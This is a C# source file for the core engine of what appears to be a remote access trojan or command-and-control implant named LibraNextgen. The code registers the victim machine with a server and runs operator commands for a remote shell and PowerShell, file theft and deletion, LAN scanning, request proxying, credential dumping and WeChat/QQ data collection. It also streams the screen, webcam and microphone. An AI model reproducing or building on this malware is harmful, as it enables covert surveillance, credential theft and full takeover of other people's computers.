using System.Diagnostics;
using LibraNextgen.Agent.Communication;
using LibraNextgen.Agent.Crypto;
using LibraNextgen.Agent.Modules.Execution;
using LibraNextgen.Agent.Modules.Recon;
using LibraNextgen.Agent.Platform;
using LibraNextgen.Common.Protocol;

namespace LibraNextgen.Agent.Core;

public class AgentEngine
{
    private readonly ConfigManager _config;
    private readonly AgentCrypto _crypto;
    private readonly IPlatformExecutor _executor;
    private ICommunicator _http = null!;
    private WsCommunicator? _ws;
    private string _agentId = string.Empty;
    private string _hostname = string.Empty;
    private CancellationTokenSource? _cts;
    private InteractiveShellHandle? _shell;
    private ScreenCapture? _screenCapture;
    private CameraCapture? _cameraCapture;
    private MicCapture? _micCapture;

    public AgentEngine(ConfigManager config, AgentCrypto crypto)
    {
        _config = config;
        _crypto = crypto;
        _executor = OperatingSystem.IsWindows()
            ? new WindowsExecutor()
            : new LinuxExecutor();
    }

    public async Task RunAsync(CancellationToken cancellationToken = default)
    {
        _cts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        _crypto.GenerateKeyPair();

        _hostname = Environment.MachineName;
        var userName = Environment.UserName;
        var osVersion = SystemInfo.GetOsVersion();
        var arch = Environment.Is64BitOperatingSystem ? "x64" : "x86";

        Console.WriteLine("[Agent] Collecting hardware info...");
        var hardware = HardwareCollector.Collect();
        hardware.Hwid = HardwareCollector.ComputeHwid(hardware);
        Console.WriteLine($"[Agent] HWID: {hardware.Hwid}");
        var hardwareJson = HardwareCollector.Serialize(hardware);

        _http = new HttpCommunicator(_config);

        Console.WriteLine($"[Agent] Starting on {_hostname}...");

        _agentId = await _http.RegisterAsync(
            _hostname, userName, osVersion, arch, _crypto.RsaPublicKey ?? "", hardwareJson, _cts.Token);

        if (string.IsNullOrEmpty(_agentId))
        {
            Console.WriteLine("[Agent] Registration failed. Exiting.");
            return;
        }

        Console.WriteLine($"[Agent] Registered as {_agentId}");

        // Connect WebSocket for real-time shell + file operations
        try
        {
            _ws = new WsCommunicator(_config.ServerUrl, _agentId);
            await _ws.ConnectAsync(_cts.Token);
            Console.WriteLine("[Agent] WebSocket connected.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Agent] WS connect failed: {ex.Message}. Falling back to HTTP-only.");
            _ws = null;
        }

        // Fetch geo info in background (cached for subsequent requests)
        _ = Task.Run(async () =>
        {
            try
            {
                var geoJson = await NetworkInfo.WarmupGeoAsync();
                if (geoJson != null && _ws != null && _ws.IsConnected)
                {
                    await _ws.SendResultRawAsync("agent.geo.update", _agentId, geoJson);
                }
            }
            catch { /* best-effort */ }
        });

        // Run heartbeat + WS receive loop in parallel
        try
        {
            if (_ws != null)
            {
                var heartbeatTask = HeartbeatLoopAsync(_cts.Token);
                var wsTask = WsReceiveLoopAsync(_cts.Token);
                await Task.WhenAny(heartbeatTask, wsTask);
            }
            else
            {
                await HeartbeatLoopAsync(_cts.Token);
            }
        }
        finally
        {
            // Ensure all loops stop and resources are released
            _cts.Cancel();
            KillShell();
            HandleScreenUnbind();
            HandleCameraUnbind();
            HandleMicUnbind();
            _ws?.Dispose();
        }
    }

    private async Task HeartbeatLoopAsync(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                var interval = _config.GetJitteredInterval();
                await Task.Delay(interval, ct);

                var task = await _http.HeartbeatAsync(_agentId, ct);
                if (task != null)
                {
                    Console.WriteLine($"[Agent] Received task: {task.CommandType} - {task.Command}");
                    await ExecuteTaskAsync(task, ct);
                }
            }
            catch (TaskCanceledException) { break; }
            catch (Exception ex)
            {
                Console.WriteLine($"[Agent] Heartbeat error: {ex.Message}");
            }
        }
    }

    private async Task WsReceiveLoopAsync(CancellationToken ct)
    {
        if (_ws == null) return;

        while (!ct.IsCancellationRequested && _ws.IsConnected)
        {
            try
            {
                var msg = await _ws.ReceiveAsync(ct);
                if (msg == null) break;

                await HandleWsMessage(msg, ct);
            }
            catch (OperationCanceledException) { break; }
            catch (Exception ex)
            {
                Console.WriteLine($"[Agent] WS error: {ex.Message}");
            }
        }

        // WS disconnected — clean up shell, screen, camera, mic
        KillShell();
        HandleScreenUnbind();
        HandleCameraUnbind();
        HandleMicUnbind();
    }

    private async Task HandleWsMessage(WebSocketMessage msg, CancellationToken ct)
    {
        if (_ws == null) return;

        switch (msg.Type)
        {
            case "shell.bind":
                StartShell();
                break;

            case "shell.unbind":
                KillShell();
                break;

            case "screen.bind":
                HandleScreenBind(msg);
                break;

            case "screen.unbind":
                HandleScreenUnbind();
                break;

            case "screen.config":
                HandleScreenConfig(msg);
                break;

            case "camera.list":
                await HandleCameraList(msg);
                break;

            case "camera.bind":
                HandleCameraBind(msg);
                break;

            case "camera.unbind":
                HandleCameraUnbind();
                break;

            case "camera.config":
                HandleCameraConfig(msg);
                break;

            case "mic.list":
                await HandleMicList(msg);
                break;

            case "mic.bind":
                HandleMicBind(msg);
                break;

            case "mic.unbind":
                HandleMicUnbind();
                break;

            case "shell.input":
                HandleShellInput(msg);
                break;

            case "file.drives":
                await HandleFileDrives(msg, ct);
                break;

            case "file.list":
                await HandleFileList(msg, ct);
                break;

            case "file.read":
                await HandleFileRead(msg, ct);
                break;

            case "file.write":
                await HandleFileWrite(msg, ct);
                break;

            case "file.delete":
                await HandleFileDelete(msg, ct);
                break;

            case "file.mkdir":
                await HandleFileMkdir(msg, ct);
                break;

            case "file.rename":
                await HandleFileRename(msg, ct);
                break;

            case "file.move":
                await HandleFileMove(msg, ct);
                break;

            case "file.copy":
                await HandleFileCopy(msg, ct);
                break;

            case "file.compress":
                await HandleFileCompress(msg, ct);
                break;

            case "file.decompress":
                await HandleFileDecompress(msg, ct);
                break;

            case "file.shortcut":
                await HandleFileShortcut(msg, ct);
                break;

            case "system.processes":
                await HandleSystemProcesses(msg, ct);
                break;

            case "system.processes.kill":
                await HandleSystemProcessKill(msg, ct);
                break;

            case "system.windows":
                await HandleSystemWindows(msg, ct);
                break;

            case "system.windows.close":
                await HandleSystemWindowAction(msg, "close", ct);
                break;

            case "system.windows.minimize":
                await HandleSystemWindowAction(msg, "minimize", ct);
                break;

            case "system.windows.maximize":
                await HandleSystemWindowAction(msg, "maximize", ct);
                break;

            case "system.windows.topmost":
                await HandleSystemWindowAction(msg, "topmost", ct);
                break;

            case "system.windows.bottom":
                await HandleSystemWindowAction(msg, "bottom", ct);
                break;

            case "system.windows.settitle":
                await HandleSystemWindowSetTitle(msg, ct);
                break;

            case "system.env":
                await HandleSystemEnv(msg, ct);
                break;

            case "system.env.set":
                await HandleSystemEnvSet(msg, ct);
                break;

            case "system.env.delete":
                await HandleSystemEnvDelete(msg, ct);
                break;

            case "system.network":
                await HandleSystemNetwork(msg, ct);
                break;

            case "system.lanscan":
                await HandleSystemLanScan(msg, ct);
                break;

            case "othersoft.wechat":
                await HandleOtherSoftWeChat(msg, ct);
                break;

            case "othersoft.qq":
                await HandleOtherSoftQQ(msg, ct);
                break;

            case "proxy.fetch":
                await HandleProxyFetch(msg, ct);
                break;
        }
    }

    // ── Shell ──────────────────────────────────────────────────────────────

    private void StartShell()
    {
        KillShell();

        try
        {
            var handle = _executor.StartInteractiveShell();
            _shell = handle;
            var proc = handle.Process;
            var ct = handle.Cts.Token;

            // Read stdout in background
            _ = Task.Run(async () =>
            {
                var buf = new char[1024];
                try
                {
                    while (!ct.IsCancellationRequested && !proc.HasExited)
                    {
                        var n = await proc.StandardOutput.ReadAsync(buf, 0, buf.Length);
                        if (n > 0)
                        {
                            var text = new string(buf, 0, n);
                            await SendShellOutput(text);
                        }
                    }
                }
                catch (OperationCanceledException) { }
                catch (Exception ex)
                {
                    await SendShellOutput($"\r\n[Shell read error: {ex.Message}]\r\n");
                }
            }, ct);

            // Read stderr in background
            _ = Task.Run(async () =>
            {
                var buf = new char[1024];
                try
                {
                    while (!ct.IsCancellationRequested && !proc.HasExited)
                    {
                        var n = await proc.StandardError.ReadAsync(buf, 0, buf.Length);
                        if (n > 0)
                        {
                            var text = new string(buf, 0, n);
                            await SendShellOutput(text);
                        }
                    }
                }
                catch (OperationCanceledException) { }
                catch { /* ignore */ }
            }, ct);

            // Detect process exit
            _ = Task.Run(async () =>
            {
                try
                {
                    await proc.WaitForExitAsync(ct);
                    if (!ct.IsCancellationRequested)
                    {
                        await SendShellOutput("\r\n[Shell process exited]\r\n");
                    }
                }
                catch { /* ignore */ }
            }, ct);
        }
        catch (Exception ex)
        {
            _ = SendShellOutput($"\r\n[Failed to start shell: {ex.Message}]\r\n");
        }
    }

    private void HandleShellInput(WebSocketMessage msg)
    {
        if (_shell?.Process is { HasExited: false } proc)
        {
            var text = msg.Data?.GetProperty("text").GetString() ?? "";
            proc.StandardInput.Write(text);
            proc.StandardInput.Flush();
        }
    }

    private void KillShell()
    {
        try
        {
            _shell?.Cts.Cancel();
            if (_shell?.Process is { HasExited: false } proc)
            {
                proc.Kill(true);
                proc.Dispose();
            }
        }
        catch { /* ignore */ }
        _shell = null;
    }

    private async Task SendShellOutput(string text)
    {
        if (_ws == null || !_ws.IsConnected) return;

        try
        {
            var dataJson = $$"""{"text":"{{JsonEscape(text)}}"}""";
            await _ws.SendResultRawAsync("shell.output", _agentId, dataJson);
        }
        catch { /* ignore */ }
    }

    // ── File operations ──────────────────────────────────────────────────

    private async Task HandleFileDrives(WebSocketMessage msg, CancellationToken ct)
    {
        var drives = _executor.GetDrives();
        if (_ws != null)
        {
            var escaped = drives.Select(d => $"\"{JsonEscape(d)}\"");
            var dataJson = $"[{string.Join(",", escaped)}]";
            await _ws.SendResultRawAsync("file.drives.result", _agentId, dataJson, msg.RequestId);
        }
    }

    private async Task HandleFileList(WebSocketMessage msg, CancellationToken ct)
    {
        var path = msg.Data?.GetProperty("path").GetString() ?? "C:\\";
        var result = FileOps.ListDirectory(path);
        if (_ws != null)
            await _ws.SendResultRawAsync("file.list.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleFileRead(WebSocketMessage msg, CancellationToken ct)
    {
        var path = msg.Data?.GetProperty("path").GetString() ?? "";
        var result = FileOps.ReadFile(path);
        if (_ws != null)
            await _ws.SendResultRawAsync("file.read.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleFileWrite(WebSocketMessage msg, CancellationToken ct)
    {
        var path = msg.Data?.GetProperty("path").GetString() ?? "";
        var content = msg.Data?.GetProperty("content").GetString() ?? "";
        var result = FileOps.WriteFile(path, content);
        if (_ws != null)
            await _ws.SendResultRawAsync("file.write.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleFileDelete(WebSocketMessage msg, CancellationToken ct)
    {
        var path = msg.Data?.GetProperty("path").GetString() ?? "";
        var result = FileOps.DeleteFile(path);
        if (_ws != null)
            await _ws.SendResultRawAsync("file.delete.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleFileMkdir(WebSocketMessage msg, CancellationToken ct)
    {
        var path = msg.Data?.GetProperty("path").GetString() ?? "";
        var result = FileOps.CreateDirectory(path);
        if (_ws != null)
            await _ws.SendResultRawAsync("file.mkdir.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleFileRename(WebSocketMessage msg, CancellationToken ct)
    {
        var path = msg.Data?.GetProperty("path").GetString() ?? "";
        var newName = msg.Data?.GetProperty("newName").GetString() ?? "";
        var result = FileOps.Rename(path, newName);
        if (_ws != null)
            await _ws.SendResultRawAsync("file.rename.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleFileMove(WebSocketMessage msg, CancellationToken ct)
    {
        var source = msg.Data?.GetProperty("source").GetString() ?? "";
        var destination = msg.Data?.GetProperty("destination").GetString() ?? "";
        var result = FileOps.Move(source, destination);
        if (_ws != null)
            await _ws.SendResultRawAsync("file.move.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleFileCopy(WebSocketMessage msg, CancellationToken ct)
    {
        var source = msg.Data?.GetProperty("source").GetString() ?? "";
        var destination = msg.Data?.GetProperty("destination").GetString() ?? "";
        var result = FileOps.Copy(source, destination);
        if (_ws != null)
            await _ws.SendResultRawAsync("file.copy.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleFileCompress(WebSocketMessage msg, CancellationToken ct)
    {
        var path = msg.Data?.GetProperty("path").GetString() ?? "";
        var result = FileOps.Compress(path);
        if (_ws != null)
            await _ws.SendResultRawAsync("file.compress.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleFileDecompress(WebSocketMessage msg, CancellationToken ct)
    {
        var path = msg.Data?.GetProperty("path").GetString() ?? "";
        string? destination = null;
        try { destination = msg.Data?.GetProperty("destination").GetString(); } catch { }
        var result = FileOps.Decompress(path, destination);
        if (_ws != null)
            await _ws.SendResultRawAsync("file.decompress.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleFileShortcut(WebSocketMessage msg, CancellationToken ct)
    {
        var path = msg.Data?.GetProperty("path").GetString() ?? "";
        var result = FileOps.CreateShortcut(path);
        if (_ws != null)
            await _ws.SendResultRawAsync("file.shortcut.result", _agentId, result, msg.RequestId);
    }

    // ── System info operations ──────────────────────────────────────────

    private async Task HandleSystemProcesses(WebSocketMessage msg, CancellationToken ct)
    {
        string? lastHash = null;
        try { lastHash = msg.Data?.GetProperty("lastHash").GetString(); } catch { }
        var result = ProcessInfo.Collect(lastHash);
        if (_ws != null)
            await _ws.SendResultRawAsync("system.processes.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleSystemProcessKill(WebSocketMessage msg, CancellationToken ct)
    {
        var pid = msg.Data?.GetProperty("pid").GetInt32() ?? 0;
        var success = ProcessInfo.Kill(pid);
        if (_ws != null)
        {
            var dataJson = $$"""{"success":{{success.ToString().ToLowerInvariant()}},"pid":{{pid}}}""";
            await _ws.SendResultRawAsync("system.processes.kill.result", _agentId, dataJson, msg.RequestId);
        }
    }

    private async Task HandleSystemWindows(WebSocketMessage msg, CancellationToken ct)
    {
        var result = WindowInfo.Collect();
        if (_ws != null)
            await _ws.SendResultRawAsync("system.windows.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleSystemWindowAction(WebSocketMessage msg, string action, CancellationToken ct)
    {
        var hwnd = msg.Data?.GetProperty("hwnd").GetInt64() ?? 0;
        var result = action switch
        {
            "close" => WindowInfo.CloseWindow(hwnd),
            "minimize" => WindowInfo.MinimizeWindow(hwnd),
            "maximize" => WindowInfo.MaximizeWindow(hwnd),
            "topmost" => WindowInfo.SetTopmost(hwnd),
            "bottom" => WindowInfo.SetBottom(hwnd),
            _ => """{"error":"Unknown action"}"""
        };
        if (_ws != null)
            await _ws.SendResultRawAsync($"system.windows.{action}.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleSystemWindowSetTitle(WebSocketMessage msg, CancellationToken ct)
    {
        var hwnd = msg.Data?.GetProperty("hwnd").GetInt64() ?? 0;
        var title = msg.Data?.GetProperty("title").GetString() ?? "";
        var result = WindowInfo.SetTitle(hwnd, title);
        if (_ws != null)
            await _ws.SendResultRawAsync("system.windows.settitle.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleSystemEnv(WebSocketMessage msg, CancellationToken ct)
    {
        var result = EnvInfo.Collect();
        if (_ws != null)
            await _ws.SendResultRawAsync("system.env.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleSystemEnvSet(WebSocketMessage msg, CancellationToken ct)
    {
        var name = msg.Data?.GetProperty("name").GetString() ?? "";
        var value = msg.Data?.GetProperty("value").GetString() ?? "";
        var scope = msg.Data?.GetProperty("scope").GetString() ?? "user";
        var success = EnvInfo.Set(name, value, scope);
        if (_ws != null)
        {
            var envSetJson = $$"""{"success":{{success.ToString().ToLowerInvariant()}}}""";
            await _ws.SendResultRawAsync("system.env.set.result", _agentId, envSetJson, msg.RequestId);
        }
    }

    private async Task HandleSystemEnvDelete(WebSocketMessage msg, CancellationToken ct)
    {
        var name = msg.Data?.GetProperty("name").GetString() ?? "";
        var scope = msg.Data?.GetProperty("scope").GetString() ?? "user";
        var success = EnvInfo.Delete(name, scope);
        if (_ws != null)
        {
            var envDelJson = $$"""{"success":{{success.ToString().ToLowerInvariant()}}}""";
            await _ws.SendResultRawAsync("system.env.delete.result", _agentId, envDelJson, msg.RequestId);
        }
    }

    private async Task HandleSystemNetwork(WebSocketMessage msg, CancellationToken ct)
    {
        var result = await NetworkInfo.CollectAsync();
        if (_ws != null)
            await _ws.SendResultRawAsync("system.network.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleSystemLanScan(WebSocketMessage msg, CancellationToken ct)
    {
        var result = await LanScan.ScanAsync();
        if (_ws != null)
            await _ws.SendResultRawAsync("system.lanscan.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleOtherSoftWeChat(WebSocketMessage msg, CancellationToken ct)
    {
        var result = OtherSoftware.CollectWeChat();
        if (_ws != null)
            await _ws.SendResultRawAsync("othersoft.wechat.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleOtherSoftQQ(WebSocketMessage msg, CancellationToken ct)
    {
        var result = OtherSoftware.CollectQQ();
        if (_ws != null)
            await _ws.SendResultRawAsync("othersoft.qq.result", _agentId, result, msg.RequestId);
    }

    private async Task HandleProxyFetch(WebSocketMessage msg, CancellationToken ct)
    {
        var url = "";
        var method = "GET";
        string? headers = null;
        string? body = null;
        try { url = msg.Data?.GetProperty("url").GetString() ?? ""; } catch { }
        try { method = msg.Data?.GetProperty("method").GetString() ?? "GET"; } catch { }
        try { headers = msg.Data?.GetProperty("headers").GetString(); } catch { }
        try { body = msg.Data?.GetProperty("body").GetString(); } catch { }

        var result = await ProxyBrowser.FetchAsync(url, method, headers, body);
        if (_ws != null)
            await _ws.SendResultRawAsync("proxy.fetch.result", _agentId, result, msg.RequestId);
    }

    // ── HTTP Task execution (heartbeat) ──────────────────────────────────

    private async Task ExecuteTaskAsync(LibraNextgen.Common.Models.AgentTask task, CancellationToken ct)
    {
        var output = "";
        var error = "";
        var success = false;

        try
        {
            switch (task.CommandType)
            {
                case Common.Models.CommandType.Shell:
                    output = await _executor.ExecuteAsync(task.Command, ct);
                    success = true;
                    break;
                case Common.Models.CommandType.PowerShell:
                    output = await PowerShellRunner.ExecuteAsync(task.Command, ct);
                    success = true;
                    break;
                case Common.Models.CommandType.LocalAccounts:
                    output = await LocalAccountEnumerator.EnumerateAsync(ct);
                    success = true;
                    break;
                case Common.Models.CommandType.CredDump:
                    output = await CredentialDumper.DumpAsync(ct);
                    success = true;
                    break;
                case Common.Models.CommandType.FileList:
                    output = FileOps.ListDirectory(task.Command);
                    success = true;
                    break;
                case Common.Models.CommandType.FileDrives:
                    var drives = _executor.GetDrives();
                    var escaped = drives.Select(d => $"\"{JsonEscape(d)}\"");
                    output = $"[{string.Join(",", escaped)}]";
                    success = true;
                    break;
                case Common.Models.CommandType.Sleep:
                    if (int.TryParse(task.Command, out var seconds))
                    {
                        await Task.Delay(seconds * 1000, ct);
                        output = $"Slept for {seconds}s";
                        success = true;
                    }
                    break;
                default:
                    output = $"Unknown command type: {task.CommandType}";
                    break;
            }
        }
        catch (Exception ex)
        {
            error = ex.Message;
        }

        var escapedOutput = JsonEscape(output);
        var escapedError = JsonEscape(error);
        var resultJson = $"{{\"taskId\":\"{task.Id}\",\"success\":{success.ToString().ToLowerInvariant()},\"output\":\"{escapedOutput}\",\"error\":\"{escapedError}\"}}";
        await _http.SubmitResultAsync(_agentId, resultJson, ct);
    }

    private static string JsonEscape(string s)
    {
        var sb = new System.Text.StringBuilder(s.Length);
        foreach (var c in s)
        {
            switch (c)
            {
                case '\\': sb.Append("\\\\"); break;
                case '"': sb.Append("\\\""); break;
                case '\n': sb.Append("\\n"); break;
                case '\r': sb.Append("\\r"); break;
                case '\t': sb.Append("\\t"); break;
                case '\b': sb.Append("\\b"); break;
                case '\f': sb.Append("\\f"); break;
                default: sb.Append(c); break;
            }
        }
        return sb.ToString();
    }

    // ── Screen Capture ────────────────────────────────────────────────────

    private void HandleScreenBind(WebSocketMessage msg)
    {
        HandleScreenUnbind();
        int fps = 5;
        string quality = "720p";
        try
        {
            if (msg.Data?.TryGetProperty("fps", out var fpsEl) == true)
                fps = fpsEl.GetInt32();
            if (msg.Data?.TryGetProperty("quality", out var qEl) == true)
                quality = qEl.GetString() ?? "720p";
        }
        catch { }

        _screenCapture = new ScreenCapture(_ws!, _agentId);
        _screenCapture.Start(fps, quality);
    }

    private void HandleScreenUnbind()
    {
        _screenCapture?.Stop();
        _screenCapture?.Dispose();
        _screenCapture = null;
    }

    private void HandleScreenConfig(WebSocketMessage msg)
    {
        if (_screenCapture == null) return;
        try
        {
            if (msg.Data?.TryGetProperty("fps", out var fpsEl) == true)
                _screenCapture.SetFps(fpsEl.GetInt32());
            if (msg.Data?.TryGetProperty("quality", out var qEl) == true)
                _screenCapture.SetQuality(qEl.GetString() ?? "720p");
        }
        catch { }
    }

    // ── Camera Capture ────────────────────────────────────────────────────

    private async Task HandleCameraList(WebSocketMessage msg)
    {
        var json = CameraCapture.GetDevicesJson();
        await _ws!.SendResultRawAsync("camera.list", _agentId, json, msg.RequestId);
    }

    private void HandleCameraBind(WebSocketMessage msg)
    {
        HandleCameraUnbind();
        int fps = 10;
        int cameraIndex = 0;
        try
        {
            if (msg.Data?.TryGetProperty("fps", out var fpsEl) == true)
                fps = fpsEl.GetInt32();
            if (msg.Data?.TryGetProperty("cameraIndex", out var idxEl) == true)
                cameraIndex = idxEl.GetInt32();
        }
        catch { }

        _cameraCapture = new CameraCapture(_ws!, _agentId);
        _cameraCapture.Start(fps, cameraIndex);
    }

    private void HandleCameraUnbind()
    {
        _cameraCapture?.Stop();
        _cameraCapture?.Dispose();
        _cameraCapture = null;
    }

    private void HandleCameraConfig(WebSocketMessage msg)
    {
        if (_cameraCapture == null) return;
        try
        {
            if (msg.Data?.TryGetProperty("fps", out var fpsEl) == true)
                _cameraCapture.SetFps(fpsEl.GetInt32());
        }
        catch { }
    }

    // ── Microphone Capture ────────────────────────────────────────────────

    private async Task HandleMicList(WebSocketMessage msg)
    {
        var json = MicCapture.GetDevicesJson();
        await _ws!.SendResultRawAsync("mic.list", _agentId, json, msg.RequestId);
    }

    private void HandleMicBind(WebSocketMessage msg)
    {
        HandleMicUnbind();
        int deviceIndex = 0;
        try
        {
            if (msg.Data?.TryGetProperty("deviceIndex", out var idxEl) == true)
                deviceIndex = idxEl.GetInt32();
        }
        catch { }

        _micCapture = new MicCapture(_ws!, _agentId);
        _micCapture.Start(deviceIndex);
    }

    private void HandleMicUnbind()
    {
        _micCapture?.Stop();
        _micCapture?.Dispose();
        _micCapture = null;
    }
}
